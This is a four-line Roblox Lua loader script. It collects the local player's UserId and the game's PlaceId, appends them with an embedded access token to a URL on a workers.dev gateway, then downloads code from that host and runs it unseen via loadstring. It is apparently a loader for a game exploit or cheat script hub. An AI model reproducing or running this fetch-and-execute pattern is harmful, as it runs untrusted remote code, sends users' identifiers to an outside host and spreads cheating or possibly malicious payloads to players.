local _uid = tostring(game:GetService("Players").LocalPlayer.UserId)
local _pid = tostring(game.PlaceId)
local _url = "https://lazybear-gateway.iusemaybehook.workers.dev/?file=1468213301233062013_123.lua&token=x6oYzLgRKrb9VMLideTwEVd0woyqwkSFDQbk09LxvMQ&uid=".._uid.."&pid=".._pid
loadstring(game:HttpGet(_url, true))()
